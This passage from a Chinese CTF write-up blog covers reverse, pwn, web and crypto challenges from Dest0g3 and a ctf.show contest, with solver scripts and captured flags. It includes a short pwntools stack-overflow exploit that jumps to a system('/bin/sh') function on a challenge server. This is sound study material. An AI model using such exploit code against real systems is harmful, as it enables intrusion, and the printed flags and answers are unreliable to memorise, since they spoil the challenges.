class="hljs-number">0x5a</span>, <span class="hljs-number">0xcc</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0xf9</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0x1c</span>, <span class="hljs-number">0x9e</span>,<br>            <span class="hljs-number">0x58</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x9d</span>, <span class="hljs-number">0xf7</span>, <span class="hljs-number">0xfd</span>, <span class="hljs-number">0x4a</span>, <span class="hljs-number">0x3e</span>, <span class="hljs-number">0xfb</span>, <span class="hljs-number">0x1d</span>, <span class="hljs-number">0x2c</span>,<br>            <span class="hljs-number">0x4d</span>, <span class="hljs-number">0x0c</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0xb1</span>, <span class="hljs-number">0x3b</span>, <span class="hljs-number">0x8d</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0xed</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0xb1</span>,<br>            <span class="hljs-number">0x73</span>, <span class="hljs-number">0x8d</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0xe6</span>, <span class="hljs-number">0xe7</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x3c</span>,<br>            <span class="hljs-number">0</span>, <span class="hljs-number">0x3a</span>, <span class="hljs-number">0xa6</span>, <span class="hljs-number">0x9d</span>, <span class="hljs-number">0x32</span>&#125;;<br><br>BYTE enc[] = &#123;<span class="hljs-number">0x97</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0xc6</span>, <span class="hljs-number">0x1c</span>, <span class="hljs-number">0x7a</span>, <span class="hljs-number">0x8e</span>, <span class="hljs-number">0x9f</span>,<br>              <span class="hljs-number">0x46</span>, <span class="hljs-number">0xbd</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0xe7</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0xf3</span>, <span class="hljs-number">0xee</span>, <span class="hljs-number">0x69</span>,<br>              <span class="hljs-number">0x49</span>, <span class="hljs-number">0xf7</span>, <span class="hljs-number">0x0e</span>, <span class="hljs-number">0xe3</span>, <span class="hljs-number">0xe2</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0xc0</span>, <span class="hljs-number">0xb9</span>,<br>              <span class="hljs-number">0x2c</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0xa4</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x98</span>,<br>              <span class="hljs-number">0x39</span>, <span class="hljs-number">0xa9</span>, <span class="hljs-number">0xb5</span>, <span class="hljs-number">0xe5</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x0e</span>, <span class="hljs-number">0xe8</span>,<br>              <span class="hljs-number">0xac</span>, <span class="hljs-number">0xfd</span>, <span class="hljs-number">0x8b</span>, <span class="hljs-number">0xa5</span>, <span class="hljs-number">0x6d</span>&#125;;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> index = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (index &lt; <span class="hljs-number">45</span>) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0x20</span>; i &lt;= <span class="hljs-number">0x7e</span>; i++) &#123;<br>            <span class="hljs-type">int</span> v1 = <span class="hljs-number">23</span>*i;<br>            <span class="hljs-keyword">if</span> ( ((<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)((v1 + x[index]) &gt;&gt; <span class="hljs-number">31</span>) &gt;&gt; <span class="hljs-number">24</span>) + (BYTE)v1 + x[index] - ((<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)((v1 + x[index]) &gt;&gt; <span class="hljs-number">31</span>) &gt;&gt; <span class="hljs-number">24</span>) == enc[index] )&#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, i);<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>        index ++;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">// Dest0g3f82cd79-da3-04-aa0a5b3e445c&#125;</span><br></code></pre></td></tr></table></figure><p>其实那个左移31+24位可以直接去掉了，unsigned int也是4字节的，4字节一共才32位，所以前面和后面的那两个位移就是0，可以去掉。</p><p>嗯…但是跑出来的结果好像不太对，少了一部分的数据。看起来是数据类型的问题。主要是这个char他的正负有点难搞。最后统一了一下判断的格式。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windef.h&gt;</span></span><br><br>BYTE x[] = &#123;<span class="hljs-number">0x7b</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0xf3</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0xcc</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0xf9</span>, <span class="hljs-number">0x92</span>,<br>            <span class="hljs-number">0x1c</span>, <span class="hljs-number">0x9e</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x9d</span>, <span class="hljs-number">0xf7</span>, <span class="hljs-number">0xfd</span>, <span class="hljs-number">0x4a</span>,<br>            <span class="hljs-number">0x3e</span>, <span class="hljs-number">0xfb</span>, <span class="hljs-number">0x1d</span>, <span class="hljs-number">0x2c</span>, <span class="hljs-number">0x4d</span>, <span class="hljs-number">0x0c</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0xb1</span>,<br>            <span class="hljs-number">0x3b</span>, <span class="hljs-number">0x8d</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0xed</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0xb1</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x8d</span>,<br>            <span class="hljs-number">0x82</span>, <span class="hljs-number">0xe6</span>, <span class="hljs-number">0xe7</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x3c</span>,<br>            <span class="hljs-number">0</span>, <span class="hljs-number">0x3a</span>, <span class="hljs-number">0xa6</span>, <span class="hljs-number">0x9d</span>, <span class="hljs-number">0x32</span>&#125;;<br><br>BYTE enc[] = &#123;<span class="hljs-number">0x97</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0xc6</span>, <span class="hljs-number">0x1c</span>, <span class="hljs-number">0x7a</span>, <span class="hljs-number">0x8e</span>, <span class="hljs-number">0x9f</span>,<br>              <span class="hljs-number">0x46</span>, <span class="hljs-number">0xbd</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0xe7</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0xf3</span>, <span class="hljs-number">0xee</span>, <span class="hljs-number">0x69</span>,<br>              <span class="hljs-number">0x49</span>, <span class="hljs-number">0xf7</span>, <span class="hljs-number">0x0e</span>, <span class="hljs-number">0xe3</span>, <span class="hljs-number">0xe2</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0xc0</span>, <span class="hljs-number">0xb9</span>,<br>              <span class="hljs-number">0x2c</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0xa4</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x98</span>,<br>              <span class="hljs-number">0x39</span>, <span class="hljs-number">0xa9</span>, <span class="hljs-number">0xb5</span>, <span class="hljs-number">0xe5</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x0e</span>, <span class="hljs-number">0xe8</span>,<br>              <span class="hljs-number">0xac</span>, <span class="hljs-number">0xfd</span>, <span class="hljs-number">0x8b</span>, <span class="hljs-number">0xa5</span>, <span class="hljs-number">0x6d</span>&#125;;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> index = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (index &lt; <span class="hljs-number">45</span>)<br>    &#123;<br>        <span class="hljs-type">int</span> i;<br>        <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0x0</span>; i &lt;= <span class="hljs-number">0xff</span>; i++)<br>        &#123;<br>            <span class="hljs-type">int</span> v1 = <span class="hljs-number">23</span> * i;<br>            <span class="hljs-keyword">if</span> ((<span class="hljs-type">char</span>)((BYTE)v1 + x[index]) == (<span class="hljs-type">char</span>)(enc[index]))<br>            &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, i);<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>        index++;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">// Dest0g3&#123;f982cd79-d7a3-0874-aa0b-a5b37e4445c8&#125;</span><br></code></pre></td></tr></table></figure><h1 id="pwn"><a class="markdownIt-Anchor" href="#pwn"></a> PWN</h1><h2 id="ez_arrch"><a class="markdownIt-Anchor" href="#ez_arrch"></a> ez_arrch</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 <span class="hljs-title function_">sub_968</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">char</span> buf; <span class="hljs-comment">// [xsp+10h] [xbp+10h] BYREF</span><br><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Please leave your name:&quot;</span>);<br>  read(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">0x30</span>uLL);<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;OK, you can exploit it now.&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>反汇编能看到这个函数，这里就存在一个栈溢出。接下来就是看看用什么溢出的方式了。</p><p>翻二进制数据的时候发现了一个“/bin/sh”的字符串，加上程序提供了system这个函数，所以想通过这个方式来进行溢出。</p><p>当我跟随这个字符串的时候，发现他是在另外一个函数里面的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">.text:<span class="hljs-number">000000000000093</span>C ; ---------------------------------------------------------------------------<br>.text:<span class="hljs-number">000000000000093</span>C ; __unwind &#123;<br>.text:<span class="hljs-number">000000000000093</span>C                 STP             X29, X30, [SP,#<span class="hljs-number">-0x10</span>]!<br>.text:<span class="hljs-number">0000000000000940</span>                 MOV             X29, SP<br>.text:<span class="hljs-number">0000000000000944</span>                 ADRL            X0, aOkYouGetIt ; <span class="hljs-string">&quot;OK, you get it !&quot;</span><br>.text:<span class="hljs-number">000000000000094</span>C                 BL              .<span class="hljs-built_in">puts</span><br>.text:<span class="hljs-number">0000000000000950</span>                 ADRL            X0, aBinSh ; <span class="hljs-string">&quot;/bin/sh&quot;</span><br>.text:<span class="hljs-number">0000000000000958</span>                 BL              .system<br>.text:<span class="hljs-number">000000000000095</span>C                 NOP<br>.text:<span class="hljs-number">0000000000000960</span>                 LDP             X29, X30, [SP],#<span class="hljs-number">0x10</span><br>.text:<span class="hljs-number">0000000000000964</span>                 RET<br>.text:<span class="hljs-number">0000000000000964</span> ; &#125; <span class="hljs-comment">// starts at 93C</span><br></code></pre></td></tr></table></figure><p>那么我们直接跳这个函数就行了，不需要再用system+参数了。而且我看了看system的地址好像也挺奇怪的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pwn<br>r = pwn.remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>, <span class="hljs-number">28099</span>)<br>func_addr = <span class="hljs-number">0x4000000000</span> + <span class="hljs-number">0x93c</span><br>r.send(pwn.p64(func_addr)*<span class="hljs-number">10</span>)<br>r.interactive()<br><br><span class="hljs-comment"># Dest0g3&#123;e5df9fec-e7cb-4f27-9c49-62f1d260395d&#125;</span><br></code></pre></td></tr></table></figure><h1 id="web"><a class="markdownIt-Anchor" href="#web"></a> Web</h1><h2 id="phpdest"><a class="markdownIt-Anchor" href="#phpdest"></a> phpdest</h2><p>这题网上直接有解，由于我本身对Web不太熟悉，这里我只是运气好碰上了。</p><p>这里给出地址：</p><p><a href="https://blog.csdn.net/fmyyy1/article/details/117256082">https://blog.csdn.net/fmyyy1/article/details/117256082</a></p><h2 id="easyphp"><a class="markdownIt-Anchor" href="#easyphp"></a> EasyPHP</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;fl4g.php&quot;</span>;<br><span class="hljs-variable">$dest0g3</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ctf&#x27;</span>];<br><span class="hljs-variable">$time</span> = <span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;H&quot;</span>);<br><span class="hljs-variable">$timme</span> = <span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;d&quot;</span>);<br><span class="hljs-variable">$timmme</span> = <span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;i&quot;</span>);<br><span class="hljs-keyword">if</span>((<span class="hljs-variable">$time</span> &gt; <span class="hljs-string">&quot;24&quot;</span>) <span class="hljs-keyword">or</span> (<span class="hljs-variable">$timme</span> &gt; <span class="hljs-string">&quot;31&quot;</span>) <span class="hljs-keyword">or</span> (<span class="hljs-variable">$timmme</span> &gt; <span class="hljs-string">&quot;60&quot;</span>))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$fl4g</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Try harder!&quot;</span>;<br>&#125;<br><span class="hljs-title function_ invoke__">set_error_handler</span>(<br>    function() <span class="hljs-keyword">use</span>(&amp;$<span class="hljs-title">fl4g</span>) &#123;<br>        <span class="hljs-title">print</span> $<span class="hljs-title">fl4g</span>;<br>    &#125;<br>);<br><span class="hljs-variable">$fl4g</span> .= <span class="hljs-variable">$dest0g3</span>;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>主要就是要来触发这个set_error_handler，所以上传一个语法错误就行了。这里传的是一个数组。</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs subunit"># Dest0g3&#123;aa4f0051<span class="hljs-string">-414</span>d<span class="hljs-string">-46</span>bf-ab12<span class="hljs-string">-599</span>c5596c8e4&#125;<br></code></pre></td></tr></table></figure><h1 id="未完成"><a class="markdownIt-Anchor" href="#未完成"></a> 未完成</h1><h2 id="bag"><a class="markdownIt-Anchor" href="#bag"></a> Bag</h2><p>由于源程序中的数据占了很大一部分，这里的代码我自己进行了修改，把数据采用生成的方式来表示了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> flag<br><br>message = bytes_to_long(flag[<span class="hljs-number">8</span>:-<span class="hljs-number">1</span>])<br>Baglenth=<span class="hljs-number">286</span><br><span class="hljs-comment"># 下面的代码经过了修改</span><br>Bag=[<span class="hljs-number">2</span>, <span class="hljs-number">3</span>]<br><span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(Bag) &lt;= Baglenth:<br>    Bag.append(Bag[-<span class="hljs-number">1</span>]*<span class="hljs-number">2</span>)<br><br>Bag=Bag[::-<span class="hljs-number">1</span>]<br>m=<span class="hljs-number">372992427307339981616536686110115630075342113098010788080347982669869622759400031649792</span><br>w=<span class="hljs-number">274062421102700155372289583695782343443</span><br><span class="hljs-keyword">assert</span> gmpy2.gcd(m,w)==<span class="hljs-number">1</span><br>h=<span class="hljs-number">0</span><br>j=<span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> m.bit_length()%<span class="hljs-number">2</span>==<span class="hljs-number">0</span>:<br>    h=m.bit_length()<br>    j=<span class="hljs-built_in">int</span>(h//<span class="hljs-number">2</span>)<br><span class="hljs-keyword">else</span>:<br>    h=m.bit_length()<br>    j=<span class="hljs-built_in">int</span>(h//<span class="hljs-number">2</span>+<span class="hljs-number">1</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pad</span>(<span class="hljs-params">m,lenth</span>):<br>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(m)&lt;lenth:<br>        m=<span class="hljs-string">&#x27;0&#x27;</span>+m<br>    <span class="hljs-keyword">return</span> m<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">keygen</span>():<br>    pk=[]<br>    sk=[]<br>    sk.append(m)<br>    sk.append(<span class="hljs-built_in">int</span>(gmpy2.invert(w,m)))<br>    D=[]<br>    binD=[]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(Baglenth):<br>        di=(w*Bag[i])%m<br>        D.append(di)<br>        bindi=<span class="hljs-built_in">bin</span>(di)[<span class="hljs-number">2</span>:]<br>        bindi=pad(bindi,h)<br>        binD.append(bindi)<br>    U=[]<br>    V=[]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(Baglenth):<br>        tempu=<span class="hljs-built_in">int</span>(<span class="hljs-built_in">str</span>(binD[i][:j]),<span class="hljs-number">2</span>)<br>        U.append(tempu)<br>        tempv=<span class="hljs-built_in">int</span>(<span class="hljs-built_in">str</span>(binD[i][j:]),<span class="hljs-number">2</span>)<br>        V.append(tempv)<br>    e=gmpy2.next_prime(<span class="hljs-built_in">sum</span>(V))+<span class="hljs-number">2</span><br>    f=gmpy2.next_prime(<span class="hljs-built_in">sum</span>(U))<br>    <span class="hljs-keyword">assert</span> gmpy2.gcd(e,f)==<span class="hljs-number">1</span><br>    sk.append(<span class="hljs-built_in">int</span>(e))<br>    sk.append(<span class="hljs-built_in">int</span>(f))<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(Baglenth):<br>        ai=e*U[i]+f*V[i]<br>        pk.append(<span class="hljs-built_in">int</span>(ai))<br>    <span class="hljs-keyword">return</span> pk,sk<br>Pk,Sk=keygen()<br><span class="hljs-built_in">print</span>(Pk)<br><span class="hljs-built_in">print</span>(Sk)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Encrypt</span>(<span class="hljs-params">plain,pk</span>):<br>    mbin=<span class="hljs-built_in">bin</span>(plain)[<span class="hljs-number">2</span>:]<br>    c=<span class="hljs-number">0</span><br>    mbin=pad(mbin,Baglenth)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(Baglenth):<br>        c=c+<span class="hljs-built_in">int</span>(mbin[i])*pk[i]<br>    <span class="hljs-keyword">return</span> c<br>c=Encrypt(message,Pk)<br><span class="hljs-built_in">print</span>(c)<br><br><span class="hljs-comment"># c = 1475864207352419823225329328555476398971654057144688193866218781853021651529290611526242518</span><br><br><span class="hljs-comment"># 这里print(sk,pk)输出的数据我没有复制过来。这个程序你跑一边就能得到那些数据了。</span><br></code></pre></td></tr></table></figure><p>找到了相关的资料：</p><p><a href="https://blog.csdn.net/qq_43968080/article/details/102953485">https://blog.csdn.net/qq_43968080/article/details/102953485</a></p><p>可以看到代码中的Bag很明显符合这个超增量背包这个概念，说明这个魔改的背包公钥算法。而观察背包公钥算法的解密部分，需要的求一个逆让密文与这个逆进行模乘运算，最后使用超增量的方式进行贪心遍历即可得到解。</p><p>原本想了一下，Pk本身不就是一个超增量背包吗，不能直接进行排序求解吗，结果还真不行。</p><p>看一下sk都给了些什么，m,w和e,f都给了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(Baglenth):<br>    di=(w*Bag[i])%m<br>    D.append(di)<br>    bindi=<span class="hljs-built_in">bin</span>(di)[<span class="hljs-number">2</span>:]<br>    bindi=pad(bindi,h)<br>    binD.append(bindi)<br></code></pre></td></tr></table></figure><p>查了查资料想用LLL算法直接梭哈一把，可惜没能成功。(数学功底太差了，看不懂结果，我觉得答案应该在输出的结果中，但是我不知道是哪一个。)</p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>writeup</tag>
      
      <tag>MISC</tag>
      
      <tag>Crypto</tag>
      
      <tag>Reverse， PWN， Web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>单身杯(dsb) 2022</title>
    <link href="/2022/05/22/%E5%8D%95%E8%BA%AB%E6%9D%AF-dsb-2022/"/>
    <url>/2022/05/22/%E5%8D%95%E8%BA%AB%E6%9D%AF-dsb-2022/</url>
    
    <content type="html"><![CDATA[<p>ctf.show的2022单身杯中 没大没小的串串、misc签到、古典base、TooYoungRSA、re签到、magic、pwn签到的题解。</p><span id="more"></span><img src="https://s2.loli.net/2022/05/20/qSLBC9fJPiw5RaE.jpg" alt="我的520" style="zoom: 33%;" /><p>我觉得我连萌新都不如…</p><h1 id="misc"><a class="markdownIt-Anchor" href="#misc"></a> MISC</h1><h2 id="没大没小的串串"><a class="markdownIt-Anchor" href="#没大没小的串串"></a> 没大没小的串串</h2><figure class="highlight sqf"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><pre><code class="hljs sqf">描述:<br>打乱了大小写的<span class="hljs-built_in">flag</span>是 y0U_RE4lLy_kn0W_TH1S_ConGr4tUlAT10Ns<br>其中正确的<span class="hljs-built_in">flag</span>的md5是 <span class="hljs-number">7513209051</span>f455fa44d0fa5cd0f3e051<br></code></pre></td></tr></table></figure><p>写个爆破脚本跑就行了。我自己不知道有什么好的笛卡尔乘积的生成方法。所以这个代码不太好看…</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># solve.py</span><br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> itertools<br><br>data1 = <span class="hljs-string">&quot;y0U_RE4lLy_kn0W_TH1S_ConGr4tUlAT10Ns&quot;</span>.upper()<br>data2 = data1.lower()<br><br>data = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(data1)):<br>    <span class="hljs-keyword">if</span> data1[i] <span class="hljs-keyword">in</span> [<span class="hljs-string">&quot;_&quot;</span>,<span class="hljs-string">&quot;0&quot;</span>, <span class="hljs-string">&quot;4&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>]:<br>        data.append([data1[i]])<br>        <span class="hljs-keyword">continue</span><br>    data.append([data1[i], data2[i]])<br><br>x = itertools.product(data[<span class="hljs-number">0</span>],data[<span class="hljs-number">1</span>],data[<span class="hljs-number">2</span>],data[<span class="hljs-number">3</span>],data[<span class="hljs-number">4</span>],data[<span class="hljs-number">5</span>],data[<span class="hljs-number">6</span>],data[<span class="hljs-number">7</span>],<br>                  data[<span class="hljs-number">8</span>],data[<span class="hljs-number">9</span>],data[<span class="hljs-number">10</span>],data[<span class="hljs-number">11</span>],data[<span class="hljs-number">12</span>],data[<span class="hljs-number">13</span>],data[<span class="hljs-number">14</span>],data[<span class="hljs-number">15</span>],<br>                  data[<span class="hljs-number">16</span>],data[<span class="hljs-number">17</span>],data[<span class="hljs-number">18</span>],data[<span class="hljs-number">19</span>],data[<span class="hljs-number">20</span>],data[<span class="hljs-number">21</span>],data[<span class="hljs-number">22</span>],data[<span class="hljs-number">23</span>],<br>                  data[<span class="hljs-number">24</span>],data[<span class="hljs-number">25</span>],data[<span class="hljs-number">26</span>],data[<span class="hljs-number">27</span>],data[<span class="hljs-number">28</span>],data[<span class="hljs-number">29</span>],data[<span class="hljs-number">30</span>],data[<span class="hljs-number">31</span>],<br>                  data[<span class="hljs-number">32</span>],data[<span class="hljs-number">33</span>],data[<span class="hljs-number">34</span>],data[<span class="hljs-number">35</span>])<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> x:<br>    <span class="hljs-keyword">if</span> hashlib.md5(<span class="hljs-string">&quot;&quot;</span>.join(i).encode(<span class="hljs-string">&quot;utf8&quot;</span>)).hexdigest() == <span class="hljs-string">&quot;7513209051f455fa44d0fa5cd0f3e051&quot;</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;</span>.join(i))<br>        